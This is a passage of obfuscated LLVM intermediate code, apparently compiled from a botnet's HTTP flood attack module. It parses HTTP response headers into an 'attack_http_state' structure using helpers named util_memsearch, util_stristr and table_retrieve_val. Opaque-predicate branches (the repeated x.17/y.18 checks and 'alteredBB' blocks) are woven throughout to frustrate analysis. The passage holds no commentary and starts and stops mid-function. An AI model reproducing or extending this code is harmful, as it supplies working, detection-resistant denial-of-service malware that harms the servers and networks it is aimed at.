  %1562 = load i32, i32* @x.17
  %1563 = load i32, i32* @y.18
  %1564 = sub i32 %1562, 1
  %1565 = mul i32 %1562, %1564
  %1566 = urem i32 %1565, 2
  %1567 = icmp eq i32 %1566, 0
  %1568 = icmp slt i32 %1563, 10
  %1569 = or i1 %1567, %1568
  br i1 %1569, label %originalBBpart2177, label %originalBB175alteredBB

originalBBpart2177:                               ; preds = %originalBB175
  br label %4025

; <label>:1570:                                   ; preds = %1536
  %1571 = load i32, i32* @x.17
  %1572 = load i32, i32* @y.18
  %1573 = sub i32 %1571, 1
  %1574 = mul i32 %1571, %1573
  %1575 = urem i32 %1574, 2
  %1576 = icmp eq i32 %1575, 0
  %1577 = icmp slt i32 %1572, 10
  %1578 = or i1 %1576, %1577
  br i1 %1578, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %1570
  %1579 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1580 = load i32, i32* %12, align 4
  %1581 = call i32 @util_memsearch(i8* %1579, i32 %1580, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1582 = icmp eq i32 %1581, -1
  %1583 = load i32, i32* @x.17
  %1584 = load i32, i32* @y.18
  %1585 = sub i32 %1583, 1
  %1586 = mul i32 %1583, %1585
  %1587 = urem i32 %1586, 2
  %1588 = icmp eq i32 %1587, 0
  %1589 = icmp slt i32 %1584, 10
  %1590 = or i1 %1588, %1589
  br i1 %1590, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br i1 %1582, label %1591, label %1595

; <label>:1591:                                   ; preds = %originalBBpart2181
  %1592 = load i32, i32* %12, align 4
  %1593 = icmp slt i32 %1592, 10240
  br i1 %1593, label %1594, label %1595

; <label>:1594:                                   ; preds = %1591
  br label %4025

; <label>:1595:                                   ; preds = %1591, %originalBBpart2181
  %1596 = load i32, i32* @x.17
  %1597 = load i32, i32* @y.18
  %1598 = sub i32 %1596, 1
  %1599 = mul i32 %1596, %1598
  %1600 = urem i32 %1599, 2
  %1601 = icmp eq i32 %1600, 0
  %1602 = icmp slt i32 %1597, 10
  %1603 = or i1 %1601, %1602
  br i1 %1603, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %1595
  %1604 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1605 = load i32, i32* %12, align 4
  %1606 = call i32 @util_memsearch(i8* %1604, i32 %1605, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1607 = sext i32 %1606 to i64
  %1608 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1607
  store i8 0, i8* %1608, align 1
  %1609 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1610 = load i32, i32* %12, align 4
  %1611 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1612 = call i32 @util_stristr(i8* %1609, i32 %1610, i8* %1611)
  %1613 = icmp ne i32 %1612, -1
  %1614 = load i32, i32* @x.17
  %1615 = load i32, i32* @y.18
  %1616 = sub i32 %1614, 1
  %1617 = mul i32 %1614, %1616
  %1618 = urem i32 %1617, 2
  %1619 = icmp eq i32 %1618, 0
  %1620 = icmp slt i32 %1615, 10
  %1621 = or i1 %1619, %1620
  br i1 %1621, label %originalBBpart2185, label %originalBB183alteredBB

originalBBpart2185:                               ; preds = %originalBB183
  br i1 %1613, label %1622, label %1625

; <label>:1622:                                   ; preds = %originalBBpart2185
  %1623 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1624 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1623, i32 0, i32 11
  store i32 2, i32* %1624, align 4
  br label %1625

; <label>:1625:                                   ; preds = %1622, %originalBBpart2185
  %1626 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1627 = load i32, i32* %12, align 4
  %1628 = call i8* @table_retrieve_val(i32 52, i32* null)
  %1629 = call i32 @util_stristr(i8* %1626, i32 %1627, i8* %1628)
  %1630 = icmp ne i32 %1629, -1
  br i1 %1630, label %1631, label %1634

; <label>:1631:                                   ; preds = %1625
  %1632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1632, i32 0, i32 11
  store i32 1, i32* %1633, align 4
  br label %1634

; <label>:1634:                                   ; preds = %1631, %1625
  %1635 = load i32, i32* @x.17
  %1636 = load i32, i32* @y.18
  %1637 = sub i32 %1635, 1
  %1638 = mul i32 %1635, %1637
  %1639 = urem i32 %1638, 2
  %1640 = icmp eq i32 %1639, 0
  %1641 = icmp slt i32 %1636, 10
  %1642 = or i1 %1640, %1641
  br i1 %1642, label %originalBB187, label %originalBB187alteredBB

originalBB187:                                    ; preds = %originalBB187alteredBB, %1634
  %1643 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1644 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1643, i32 0, i32 12
  store i32 0, i32* %1644, align 4
  %1645 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1646 = load i32, i32* %12, align 4
  %1647 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1648 = call i32 @util_stristr(i8* %1645, i32 %1646, i8* %1647)
  %1649 = icmp ne i32 %1648, -1
  %1650 = load i32, i32* @x.17
  %1651 = load i32, i32* @y.18
  %1652 = sub i32 %1650, 1
  %1653 = mul i32 %1650, %1652
  %1654 = urem i32 %1653, 2
  %1655 = icmp eq i32 %1654, 0
  %1656 = icmp slt i32 %1651, 10
  %1657 = or i1 %1655, %1656
  br i1 %1657, label %originalBBpart2189, label %originalBB187alteredBB

originalBBpart2189:                               ; preds = %originalBB187
  br i1 %1649, label %1658, label %1757

; <label>:1658:                                   ; preds = %originalBBpart2189
  %1659 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1660 = load i32, i32* %12, align 4
  %1661 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1662 = call i32 @util_stristr(i8* %1659, i32 %1660, i8* %1661)
  store i32 %1662, i32* %38, align 4
  %1663 = load i32, i32* %38, align 4
  %1664 = sext i32 %1663 to i64
  %1665 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1664
  %1666 = load i8, i8* %1665, align 1
  %1667 = sext i8 %1666 to i32
  %1668 = icmp eq i32 %1667, 32
  br i1 %1668, label %1669, label %1672

; <label>:1669:                                   ; preds = %1658
  %1670 = load i32, i32* %38, align 4
  %1671 = add nsw i32 %1670, 1
  store i32 %1671, i32* %38, align 4
  br label %1672

; <label>:1672:                                   ; preds = %1669, %1658
  %1673 = load i32, i32* @x.17
  %1674 = load i32, i32* @y.18
  %1675 = sub i32 %1673, 1
  %1676 = mul i32 %1673, %1675
  %1677 = urem i32 %1676, 2
  %1678 = icmp eq i32 %1677, 0
  %1679 = icmp slt i32 %1674, 10
  %1680 = or i1 %1678, %1679
  br i1 %1680, label %originalBB191, label %originalBB191alteredBB

originalBB191:                                    ; preds = %originalBB191alteredBB, %1672
  %1681 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1682 = load i32, i32* %38, align 4
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds i8, i8* %1681, i64 %1683
  %1685 = load i32, i32* %12, align 4
  %1686 = load i32, i32* %38, align 4
  %1687 = sub nsw i32 %1685, %1686
  %1688 = call i32 @util_memsearch(i8* %1684, i32 %1687, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1688, i32* %39, align 4
  %1689 = load i32, i32* %39, align 4
  %1690 = icmp ne i32 %1689, -1
  %1691 = load i32, i32* @x.17
  %1692 = load i32, i32* @y.18
  %1693 = sub i32 %1691, 1
  %1694 = mul i32 %1691, %1693
  %1695 = urem i32 %1694, 2
  %1696 = icmp eq i32 %1695, 0
  %1697 = icmp slt i32 %1692, 10
  %1698 = or i1 %1696, %1697
  br i1 %1698, label %originalBBpart2196, label %originalBB191alteredBB

originalBBpart2196:                               ; preds = %originalBB191
  br i1 %1690, label %1699, label %1756

; <label>:1699:                                   ; preds = %originalBBpart2196
  %1700 = load i32, i32* @x.17
  %1701 = load i32, i32* @y.18
  %1702 = sub i32 %1700, 1
  %1703 = mul i32 %1700, %1702
  %1704 = urem i32 %1703, 2
  %1705 = icmp eq i32 %1704, 0
  %1706 = icmp slt i32 %1701, 10
  %1707 = or i1 %1705, %1706
  br i1 %1707, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1699
  %1708 = load i32, i32* %38, align 4
  %1709 = sext i32 %1708 to i64
  %1710 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1709
  store i8* %1710, i8** %40, align 8
  %1711 = load i32, i32* %39, align 4
  %1712 = icmp sge i32 %1711, 2
  %1713 = load i32, i32* @x.17
  %1714 = load i32, i32* @y.18
  %1715 = sub i32 %1713, 1
  %1716 = mul i32 %1713, %1715
  %1717 = urem i32 %1716, 2
  %1718 = icmp eq i32 %1717, 0
  %1719 = icmp slt i32 %1714, 10
  %1720 = or i1 %1718, %1719
  br i1 %1720, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %1712, label %1721, label %1724

; <label>:1721:                                   ; preds = %originalBBpart2200
  %1722 = load i32, i32* %39, align 4
  %1723 = sub nsw i32 %1722, 2
  store i32 %1723, i32* %39, align 4
  br label %1724

; <label>:1724:                                   ; preds = %1721, %originalBBpart2200
  %1725 = load i32, i32* @x.17
  %1726 = load i32, i32* @y.18
  %1727 = sub i32 %1725, 1
  %1728 = mul i32 %1725, %1727
  %1729 = urem i32 %1728, 2
  %1730 = icmp eq i32 %1729, 0
  %1731 = icmp slt i32 %1726, 10
  %1732 = or i1 %1730, %1731
  br i1 %1732, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1724
  %1733 = load i32, i32* %38, align 4
  %1734 = load i32, i32* %39, align 4
  %1735 = add nsw i32 %1733, %1734
  %1736 = sext i32 %1735 to i64
  %1737 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1736
  store i8 0, i8* %1737, align 1
  %1738 = load i8*, i8** %40, align 8
  %1739 = load i8*, i8** %40, align 8
  %1740 = call i32 @util_strlen(i8* %1739)
  %1741 = call i8* @table_retrieve_val(i32 50, i32* null)
  %1742 = call i32 @util_stristr(i8* %1738, i32 %1740, i8* %1741)
  %1743 = icmp ne i32 %1742, 0
  %1744 = load i32, i32* @x.17
  %1745 = load i32, i32* @y.18
  %1746 = sub i32 %1744, 1
  %1747 = mul i32 %1744, %1746
  %1748 = urem i32 %1747, 2
  %1749 = icmp eq i32 %1748, 0
  %1750 = icmp slt i32 %1745, 10
  %1751 = or i1 %1749, %1750
  br i1 %1751, label %originalBBpart2212, label %originalBB202alteredBB

originalBBpart2212:                               ; preds = %originalBB202
  br i1 %1743, label %1752, label %1755

; <label>:1752:                                   ; preds = %originalBBpart2212
  %1753 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1754 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1753, i32 0, i32 12
  store i32 1, i32* %1754, align 4
  br label %1755

; <label>:1755:                                   ; preds = %1752, %originalBBpart2212
  br label %1756

; <label>:1756:                                   ; preds = %1755, %originalBBpart2196
  br label %1757

; <label>:1757:                                   ; preds = %1756, %originalBBpart2189
  %1758 = load i32, i32* @x.17
  %1759 = load i32, i32* @y.18
  %1760 = sub i32 %1758, 1
  %1761 = mul i32 %1758, %1760
  %1762 = urem i32 %1761, 2
  %1763 = icmp eq i32 %1762, 0
  %1764 = icmp slt i32 %1759, 10
  %1765 = or i1 %1763, %1764
  br i1 %1765, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1757
  %1766 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1767 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1766, i32 0, i32 13
  store i32 0, i32* %1767, align 4
  %1768 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1769 = load i32, i32* %12, align 4
  %1770 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1771 = call i32 @util_stristr(i8* %1768, i32 %1769, i8* %1770)
  %1772 = icmp ne i32 %1771, -1
  %1773 = load i32, i32* @x.17
  %1774 = load i32, i32* @y.18
  %1775 = sub i32 %1773, 1
  %1776 = mul i32 %1773, %1775
  %1777 = urem i32 %1776, 2
  %1778 = icmp eq i32 %1777, 0
  %1779 = icmp slt i32 %1774, 10
  %1780 = or i1 %1778, %1779
  br i1 %1780, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br i1 %1772, label %1781, label %1880

; <label>:1781:                                   ; preds = %originalBBpart2216
  %1782 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1783 = load i32, i32* %12, align 4
  %1784 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1785 = call i32 @util_stristr(i8* %1782, i32 %1783, i8* %1784)
  store i32 %1785, i32* %41, align 4
  %1786 = load i32, i32* %41, align 4
  %1787 = sext i32 %1786 to i64
  %1788 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1787
  %1789 = load i8, i8* %1788, align 1
  %1790 = sext i8 %1789 to i32
  %1791 = icmp eq i32 %1790, 32
  br i1 %1791, label %1792, label %1795

; <label>:1792:                                   ; preds = %1781
  %1793 = load i32, i32* %41, align 4
  %1794 = add nsw i32 %1793, 1
  store i32 %1794, i32* %41, align 4
  br label %1795

; <label>:1795:                                   ; preds = %1792, %1781
  %1796 = load i32, i32* @x.17
  %1797 = load i32, i32* @y.18
  %1798 = sub i32 %1796, 1
  %1799 = mul i32 %1796, %1798
  %1800 = urem i32 %1799, 2
  %1801 = icmp eq i32 %1800, 0
  %1802 = icmp slt i32 %1797, 10
  %1803 = or i1 %1801, %1802
  br i1 %1803, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1795
  %1804 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1805 = load i32, i32* %41, align 4
  %1806 = sext i32 %1805 to i64
  %1807 = getelementptr inbounds i8, i8* %1804, i64 %1806
  %1808 = load i32, i32* %12, align 4
  %1809 = load i32, i32* %41, align 4
  %1810 = sub nsw i32 %1808, %1809
  %1811 = call i32 @util_memsearch(i8* %1807, i32 %1810, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1811, i32* %42, align 4
  %1812 = load i32, i32* %42, align 4
  %1813 = icmp ne i32 %1812, -1
  %1814 = load i32, i32* @x.17
  %1815 = load i32, i32* @y.18
  %1816 = sub i32 %1814, 1
  %1817 = mul i32 %1814, %1816
  %1818 = urem i32 %1817, 2
  %1819 = icmp eq i32 %1818, 0
  %1820 = icmp slt i32 %1815, 10
  %1821 = or i1 %1819, %1820
  br i1 %1821, label %originalBBpart2223, label %originalBB218alteredBB

originalBBpart2223:                               ; preds = %originalBB218
  br i1 %1813, label %1822, label %1879

; <label>:1822:                                   ; preds = %originalBBpart2223
  %1823 = load i32, i32* %41, align 4
  %1824 = sext i32 %1823 to i64
  %1825 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1824
  store i8* %1825, i8** %43, align 8
  %1826 = load i32, i32* %42, align 4
  %1827 = icmp sge i32 %1826, 2
  br i1 %1827, label %1828, label %1831

; <label>:1828:                                   ; preds = %1822
  %1829 = load i32, i32* %42, align 4
  %1830 = sub nsw i32 %1829, 2
  store i32 %1830, i32* %42, align 4
  br label %1831

; <label>:1831:                                   ; preds = %1828, %1822
  %1832 = load i32, i32* @x.17
  %1833 = load i32, i32* @y.18
  %1834 = sub i32 %1832, 1
  %1835 = mul i32 %1832, %1834
  %1836 = urem i32 %1835, 2
  %1837 = icmp eq i32 %1836, 0
  %1838 = icmp slt i32 %1833, 10
  %1839 = or i1 %1837, %1838
  br i1 %1839, label %originalBB225, label %originalBB225alteredBB

originalBB225:                                    ; preds = %originalBB225alteredBB, %1831
  %1840 = load i32, i32* %41, align 4
  %1841 = load i32, i32* %42, align 4
  %1842 = add nsw i32 %1840, %1841
  %1843 = sext i32 %1842 to i64
  %1844 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1843
  store i8 0, i8* %1844, align 1
  %1845 = load i8*, i8** %43, align 8
  %1846 = load i8*, i8** %43, align 8
  %1847 = call i32 @util_strlen(i8* %1846)
  %1848 = call i8* @table_retrieve_val(i32 49, i32* null)
  %1849 = call i32 @util_stristr(i8* %1845, i32 %1847, i8* %1848)
  %1850 = icmp ne i32 %1849, 0
  %1851 = load i32, i32* @x.17
  %1852 = load i32, i32* @y.18
  %1853 = sub i32 %1851, 1
  %1854 = mul i32 %1851, %1853
  %1855 = urem i32 %1854, 2
  %1856 = icmp eq i32 %1855, 0
  %1857 = icmp slt i32 %1852, 10
  %1858 = or i1 %1856, %1857
  br i1 %1858, label %originalBBpart2228, label %originalBB225alteredBB

originalBBpart2228:                               ; preds = %originalBB225
  br i1 %1850, label %1859, label %1878

; <label>:1859:                                   ; preds = %originalBBpart2228
  %1860 = load i32, i32* @x.17
  %1861 = load i32, i32* @y.18
  %1862 = sub i32 %1860, 1
  %1863 = mul i32 %1860, %1862
  %1864 = urem i32 %1863, 2
  %1865 = icmp eq i32 %1864, 0
  %1866 = icmp slt i32 %1861, 10
  %1867 = or i1 %1865, %1866
  br i1 %1867, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1859
  %1868 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1869 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1868, i32 0, i32 13
  store i32 1, i32* %1869, align 4
  %1870 = load i32, i32* @x.17
  %1871 = load i32, i32* @y.18
  %1872 = sub i32 %1870, 1
  %1873 = mul i32 %1870, %1872
  %1874 = urem i32 %1873, 2
  %1875 = icmp eq i32 %1874, 0
  %1876 = icmp slt i32 %1871, 10
  %1877 = or i1 %1875, %1876
  br i1 %1877, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br label %1878

; <label>:1878:                                   ; preds = %originalBBpart2232, %originalBBpart2228
  br label %1879

; <label>:1879:                                   ; preds = %1878, %originalBBpart2223
  br label %1880

; <label>:1880:                                   ; preds = %1879, %originalBBpart2216
  %1881 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1882 = load i32, i32* %12, align 4
  %1883 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1884 = call i32 @util_stristr(i8* %1881, i32 %1882, i8* %1883)
  %1885 = icmp ne i32 %1884, -1
  br i1 %1885, label %1886, label %1947

; <label>:1886:                                   ; preds = %1880
  %1887 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1888 = load i32, i32* %12, align 4
  %1889 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1890 = call i32 @util_stristr(i8* %1887, i32 %1888, i8* %1889)
  store i32 %1890, i32* %44, align 4
  %1891 = load i32, i32* %44, align 4
  %1892 = sext i32 %1891 to i64
  %1893 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1892
  %1894 = load i8, i8* %1893, align 1
  %1895 = sext i8 %1894 to i32
  %1896 = icmp eq i32 %1895, 32
  br i1 %1896, label %1897, label %1900

; <label>:1897:                                   ; preds = %1886
  %1898 = load i32, i32* %44, align 4
  %1899 = add nsw i32 %1898, 1
  store i32 %1899, i32* %44, align 4
  br label %1900

; <label>:1900:                                   ; preds = %1897, %1886
  %1901 = load i32, i32* @x.17
  %1902 = load i32, i32* @y.18
  %1903 = sub i32 %1901, 1
  %1904 = mul i32 %1901, %1903
  %1905 = urem i32 %1904, 2
  %1906 = icmp eq i32 %1905, 0
  %1907 = icmp slt i32 %1902, 10
  %1908 = or i1 %1906, %1907
  br i1 %1908, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1900
  %1909 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1910 = load i32, i32* %44, align 4
  %1911 = sext i32 %1910 to i64
  %1912 = getelementptr inbounds i8, i8* %1909, i64 %1911
  %1913 = load i32, i32* %12, align 4
  %1914 = load i32, i32* %44, align 4
  %1915 = sub nsw i32 %1913, %1914
  %1916 = call i32 @util_memsearch(i8* %1912, i32 %1915, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1916, i32* %45, align 4
  %1917 = load i32, i32* %45, align 4
  %1918 = icmp ne i32 %1917, -1
  %1919 = load i32, i32* @x.17
  %1920 = load i32, i32* @y.18
  %1921 = sub i32 %1919, 1
  %1922 = mul i32 %1919, %1921
  %1923 = urem i32 %1922, 2
  %1924 = icmp eq i32 %1923, 0
  %1925 = icmp slt i32 %1920, 10
  %1926 = or i1 %1924, %1925
  br i1 %1926, label %originalBBpart2244, label %originalBB234alteredBB

originalBBpart2244:                               ; preds = %originalBB234
  br i1 %1918, label %1927, label %1946

; <label>:1927:                                   ; preds = %originalBBpart2244
  %1928 = load i32, i32* %44, align 4
  %1929 = sext i32 %1928 to i64
  %1930 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1929
  store i8* %1930, i8** %46, align 8
  %1931 = load i32, i32* %45, align 4
  %1932 = icmp sge i32 %1931, 2
  br i1 %1932, label %1933, label %1936

; <label>:1933:                                   ; preds = %1927
  %1934 = load i32, i32* %45, align 4
  %1935 = sub nsw i32 %1934, 2
  store i32 %1935, i32* %45, align 4
  br label %1936

; <label>:1936:                                   ; preds = %1933, %1927
  %1937 = load i32, i32* %44, align 4
  %1938 = load i32, i32* %45, align 4
  %1939 = add nsw i32 %1937, %1938
  %1940 = sext i32 %1939 to i64
  %1941 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1940
  store i8 0, i8* %1941, align 1
  %1942 = load i8*, i8** %46, align 8
  %1943 = call i32 @util_atoi(i8* %1942, i32 10)
  %1944 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1945 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1944, i32 0, i32 14
  store i32 %1943, i32* %1945, align 4
  br label %1946

; <label>:1946:                                   ; preds = %1936, %originalBBpart2244
  br label %1950

; <label>:1947:                                   ; preds = %1880
  %1948 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1949 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1948, i32 0, i32 14
  store i32 0, i32* %1949, align 4
  br label %1950

; <label>:1950:                                   ; preds = %1947, %1946
  %1951 = load i32, i32* @x.17
  %1952 = load i32, i32* @y.18
  %1953 = sub i32 %1951, 1
  %1954 = mul i32 %1951, %1953
  %1955 = urem i32 %1954, 2
  %1956 = icmp eq i32 %1955, 0
  %1957 = icmp slt i32 %1952, 10
  %1958 = or i1 %1956, %1957
  br i1 %1958, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %1950
  store i32 0, i32* %37, align 4
  %1959 = load i32, i32* @x.17
  %1960 = load i32, i32* @y.18
  %1961 = sub i32 %1959, 1
  %1962 = mul i32 %1959, %1961
  %1963 = urem i32 %1962, 2
  %1964 = icmp eq i32 %1963, 0
  %1965 = icmp slt i32 %1960, 10
  %1966 = or i1 %1964, %1965
  br i1 %1966, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br label %1967

; <label>:1967:                                   ; preds = %2286, %originalBBpart2248
  %1968 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1969 = load i32, i32* %37, align 4
  %1970 = sext i32 %1969 to i64
  %1971 = getelementptr inbounds i8, i8* %1968, i64 %1970
  %1972 = load i32, i32* %12, align 4
  %1973 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1974 = call i32 @util_stristr(i8* %1971, i32 %1972, i8* %1973)
  %1975 = icmp ne i32 %1974, -1
  br i1 %1975, label %1976, label %1981

; <label>:1976:                                   ; preds = %1967
  %1977 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1977, i32 0, i32 15
  %1979 = load i32, i32* %1978, align 4
  %1980 = icmp slt i32 %1979, 5
  br label %1981

; <label>:1981:                                   ; preds = %1976, %1967
  %1982 = phi i1 [ false, %1967 ], [ %1980, %1976 ]
  br i1 %1982, label %1983, label %2290

; <label>:1983:                                   ; preds = %1981
  %1984 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1985 = load i32, i32* %37, align 4
  %1986 = sext i32 %1985 to i64
  %1987 = getelementptr inbounds i8, i8* %1984, i64 %1986
  %1988 = load i32, i32* %12, align 4
  %1989 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1990 = call i32 @util_stristr(i8* %1987, i32 %1988, i8* %1989)
  store i32 %1990, i32* %47, align 4
  %1991 = load i32, i32* %37, align 4
  %1992 = load i32, i32* %47, align 4
  %1993 = add nsw i32 %1991, %1992
  %1994 = sext i32 %1993 to i64
  %1995 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1994
  %1996 = load i8, i8* %1995, align 1
  %1997 = sext i8 %1996 to i32
  %1998 = icmp eq i32 %1997, 32
  br i1 %1998, label %1999, label %2002

; <label>:1999:                                   ; preds = %1983
  %2000 = load i32, i32* %47, align 4
  %2001 = add nsw i32 %2000, 1
  store i32 %2001, i32* %47, align 4
  br label %2002

; <label>:2002:                                   ; preds = %1999, %1983
  %2003 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2004 = load i32, i32* %37, align 4
  %2005 = sext i32 %2004 to i64
  %2006 = getelementptr inbounds i8, i8* %2003, i64 %2005
  %2007 = load i32, i32* %47, align 4
  %2008 = sext i32 %2007 to i64
  %2009 = getelementptr inbounds i8, i8* %2006, i64 %2008
  %2010 = load i32, i32* %12, align 4
  %2011 = load i32, i32* %37, align 4
  %2012 = sub nsw i32 %2010, %2011
  %2013 = load i32, i32* %47, align 4
  %2014 = sub nsw i32 %2012, %2013
  %2015 = call i32 @util_memsearch(i8* %2009, i32 %2014, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2015, i32* %48, align 4
  %2016 = load i32, i32* %48, align 4
  %2017 = icmp ne i32 %2016, -1
  br i1 %2017, label %2018, label %2286

; <label>:2018:                                   ; preds = %2002
  %2019 = load i32, i32* %37, align 4
  %2020 = load i32, i32* %47, align 4
  %2021 = add nsw i32 %2019, %2020
  %2022 = sext i32 %2021 to i64
  %2023 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2022
  store i8* %2023, i8** %49, align 8
  %2024 = load i32, i32* %48, align 4
  %2025 = icmp sge i32 %2024, 2
  br i1 %2025, label %2026, label %2045

; <label>:2026:                                   ; preds = %2018
  %2027 = load i32, i32* @x.17
  %2028 = load i32, i32* @y.18
  %2029 = sub i32 %2027, 1
  %2030 = mul i32 %2027, %2029
  %2031 = urem i32 %2030, 2
  %2032 = icmp eq i32 %2031, 0
  %2033 = icmp slt i32 %2028, 10
  %2034 = or i1 %2032, %2033
  br i1 %2034, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %2026
  %2035 = load i32, i32* %48, align 4
  %2036 = sub nsw i32 %2035, 2
  store i32 %2036, i32* %48, align 4
  %2037 = load i32, i32* @x.17
  %2038 = load i32, i32* @y.18
  %2039 = sub i32 %2037, 1
  %2040 = mul i32 %2037, %2039
  %2041 = urem i32 %2040, 2
  %2042 = icmp eq i32 %2041, 0
  %2043 = icmp slt i32 %2038, 10
  %2044 = or i1 %2042, %2043
  br i1 %2044, label %originalBBpart2262, label %originalBB250alteredBB

originalBBpart2262:                               ; preds = %originalBB250
  br label %2045

; <label>:2045:                                   ; preds = %originalBBpart2262, %2018
  %2046 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2047 = load i32, i32* %37, align 4
  %2048 = sext i32 %2047 to i64
  %2049 = getelementptr inbounds i8, i8* %2046, i64 %2048
  %2050 = load i32, i32* %47, align 4
  %2051 = sext i32 %2050 to i64
  %2052 = getelementptr inbounds i8, i8* %2049, i64 %2051
  %2053 = load i32, i32* %12, align 4
  %2054 = load i32, i32* %37, align 4
  %2055 = sub nsw i32 %2053, %2054
  %2056 = load i32, i32* %47, align 4
  %2057 = sub nsw i32 %2055, %2056
  %2058 = call i32 @util_memsearch(i8* %2052, i32 %2057, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2059 = icmp sgt i32 %2058, 0
  br i1 %2059, label %2060, label %2075

; <label>:2060:                                   ; preds = %2045
  %2061 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2062 = load i32, i32* %37, align 4
  %2063 = sext i32 %2062 to i64
